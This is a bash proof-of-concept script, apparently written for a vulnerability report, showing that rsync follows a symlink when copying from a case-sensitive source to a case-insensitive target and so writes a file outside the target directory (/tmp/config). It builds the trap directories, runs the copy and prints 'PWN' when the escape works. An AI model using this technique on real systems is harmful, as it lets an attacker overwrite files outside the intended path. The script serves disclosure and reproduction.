#!/bin/bash
set -e

# Scenario:
# 	rsync copies from a case-sensitive source to a case-insensitive target
#
# Issue:
# 	rsync copies a symlink (from src to target) and then follows the symlink
# 	to write additional files/directories. 
# 
# POC:
# Consider the following directory:
# SRC
# 	topdir/
# 		secret (symlink to /tmp)
# 	TOPDIR/
# 		secret/
# 			config (file)
#
# rsync recursively copies SRC/ to a TARGET/ that is case-insensitive.
# During the copy, rsync creates the TOPDIR/secret/config by following the
# symlink "topdir/secret".
#
# rsync ends up creating /tmp/config which is outside the TARGET/ directory.
#
# Tested on:
# Ubuntu 20.04.4 LTS (bare-metal), rsync v3.1.3
# Ubuntu 20.04.4 LTS (WSL 2), rsync v3.1.3
# Ubuntu 20.04.4 LTS (bare-metal), rsync v3.2.3
# Ubuntu 20.04.4 LTS (WSL 2), rsync v3.2.3
#
#
# Could not test rsync v3.2.4 because ./configure threw the following error:
# ./configure: line 8568: syntax error near unexpected token `struct'
# ./configure: line 8568: `AC_HAVE_TYPE(struct addrinfo, #include <netdb.h>)'


# Case-sensitive directory (should be empty)
CASE_DIR=$1

# Case-insensitive directory (should be empty)
ICASE_DIR=$2

if [[ -z "$CASE_DIR" || -z "$ICASE_DIR" ]]; then
	echo "Please set the variables: CASE_DIR and ICASE_DIR"
	exit 1
else
	echo "Using case-sensitive source: $CASE_DIR"
	echo "Using case-insensitive target: $ICASE_DIR"
fi


#############################
# POC
#############################
SRC=$CASE_DIR
DST=$ICASE_DIR

# Sanity checks
rm -rf "$SRC/"* "$DST/"* /tmp/config

# Create source directory structure
mkdir -p "$SRC/topdir" "$SRC/TOPDIR/secret"
ln -s /tmp "$SRC/topdir/secret"
echo "corrupt some config..." >"$SRC/TOPDIR/secret/config"

# Do copy
rsync -a "$SRC" "$DST"

# Issue: /tmp/config is created by following symlink topdir/secret
test -f /tmp/config && echo "PWN: /tmp/config is created"
